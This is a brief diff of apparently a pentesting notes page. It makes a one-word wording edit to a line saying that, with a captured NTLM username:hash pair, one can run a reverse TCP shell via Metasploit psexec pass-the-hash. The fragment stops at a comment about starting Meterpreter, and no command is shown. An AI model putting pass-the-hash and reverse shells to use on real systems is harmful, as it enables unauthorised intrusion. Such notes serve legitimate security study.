@@ -13,7 +13,7 @@ hide:
 
 <https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/>
 
-assuming you already have the NTLM `username:ntlm-hash`, you can then run the reverse tcp shell
+assuming that you already have the NTLM `username:ntlm-hash`, you can then run the reverse tcp shell
 
 ```bash
 # start metasploit meterpreter  
